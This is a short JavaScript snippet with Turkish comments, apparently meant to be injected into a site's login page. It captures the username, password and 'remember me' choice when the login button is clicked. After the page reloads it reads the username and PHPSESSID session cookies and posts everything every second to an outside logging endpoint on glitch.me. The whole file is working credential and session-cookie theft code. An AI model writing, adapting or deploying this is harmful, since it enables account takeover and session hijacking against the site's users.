(function() {
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return null;
    }

    function setupLoginListener() {
        const loginBtn = document.querySelector('a[onclick="girisyap()"]'); // Giriş butonu
        if (loginBtn) {
            loginBtn.addEventListener('click', () => {
                const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
                const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
                const remember = document.getElementById('authCheck')?.checked || false;

                // Giriş bilgileri toplandı, ancak sayfa yenilenecek, cookie’leri sonra çekeceğiz
                localStorage.setItem('pendingLogin', JSON.stringify({
                    kuladi: username,
                    sifre: password,
                    remember: remember,
                    timestamp: Date.now()
                }));
            });
        } else {
            setTimeout(setupLoginListener, 100); // Buton bulunamazsa tekrar dene
        }
    }

    function sendCredentials() {
        const pendingLogin = localStorage.getItem('pendingLogin');
        if (!pendingLogin) return;

        const loginData = JSON.parse(pendingLogin);
        const usernameCookie = getCookie('username');
        const phpSessId = getCookie('PHPSESSID');

        // Eğer cookie’ler varsa, giriş başarılı demektir
        if (usernameCookie || phpSessId) {
            const data = {
                kuladi: loginData.kuladi,
                sifre: loginData.sifre,
                remember: loginData.remember,
                cookies: {
                    username: usernameCookie || 'Yok',
                    PHPSESSID: phpSessId || 'Yok'
                },
                timestamp: loginData.timestamp
            };

            fetch('https://katip-atlas.glitch.me/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
                credentials: 'include'
            })
                .then(() => {
                    localStorage.removeItem('pendingLogin'); // Gönderim başarılıysa temizle
                })
                .catch(() => {});
        }
    }

    // İlk yüklemede dinleyiciyi kur
    setupLoginListener();

    // Sayfa yenilendikten sonra cookie’leri kontrol et
    window.addEventListener('load', () => {
        sendCredentials();
    });

    // Periyodik kontrol (sayfa yenilenmesi gecikirse)
    setInterval(sendCredentials, 1000);
})();
